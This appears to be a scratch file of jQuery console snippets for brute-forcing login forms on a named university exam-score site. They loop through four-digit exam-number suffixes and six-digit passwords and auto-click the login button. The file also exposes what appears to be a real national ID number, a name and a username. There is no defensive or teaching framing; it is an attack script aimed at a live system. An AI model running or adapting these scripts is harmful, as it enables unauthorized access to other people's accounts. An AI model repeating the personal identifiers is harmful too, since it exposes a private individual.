$(".mini-textbox-border input[name='ksbh']").click(function(){alert(111);})
var str="10013731201";
var str2=Math.floor(Math.random()*10000);
console.log(str2);
user name:
pass:
$(".mini-textbox-border input[name='zjhm']").val("220882199507185535");
$(".mini-textbox-border input[name='ksbh']").val("10013731201"+str2);

1 0-9
2 10-19


setInterval(function(){
//	var str2=Math.floor(Math.random()*10000);
//	if(str2.length==3){
//		str2="0"+str2;
//	}
//	if(str2.length==2){
//		str2="00"+str2;
//	}
//	if(str2.length==1){
//		str2="000"+str2;
//	}
//	if(str2.length==0){
//		str2="0000"+str2;
//	}
	for(var i=0;i<10000;i++){
		var str2=String(i);
		if(str2.length==3){
			str2="0"+str2;
		}
		if(str2.length==2){
			str2="00"+str2;
		}
		if(str2.length==1){
			str2="000"+str2;
		}
		if(str2.length==0){
			str2="0000"+str2;
		}
		console.log(str);
	}
	$(".mini-textbox-border input[name='zjhm']").val("220882199507185535");
	$(".mini-textbox-border input[name='ksbh']").val("10013731201"+str2);
	$("#login").click();
	$(".mini-panel-border").css("display","none");
	console.log($(".mini-textbox-border input[name='ksbh']").val());
},1);
220882199507185535 feifei

http://yjzs.bupt.edu.cn/score/login/preexamination-login-page.html    
考生编号前11位：10013731201   总共15位，后面四位是报名顺序，大家都不一样的  
身份证号220882199507185535  
mini-panel-border
var num = 000000;
var max = 999999;
$("#username").val("13010510072");
setInterval(function(){
	num++;
	$("#password").val(num);
	$("#login").trigger("click");
//	$("#mini-6").trigger("click");
//	$("#mini-21").trigger("click");
	$("#mini-27").trigger("click");
//	$("#mini-45").trigger("click");
//	$(".mini-button").trigger("click");
	if(num > max){
		return;
	}
},1000);
var num = 000000;
var max = 999999;
$("#username").val("13010510072");
setInterval(function(){
	num++;
	var str=String(num);
	if(str.length==5){
		str="0"+str;
	}
	if(str.length==4){
		str="00"+str
	}
	if(str.length==3){
		str="000"+str;
	}
	if(str.length==2){
		str="0000"+str;
	}
	if(str.length==1){
		str="00000"+str;
	}
	
	$("#password").val(str);
	$("input[name='submit']").trigger('click');
	console.log($("#password").val());
	if(num > max){
		return;
	}
},1000);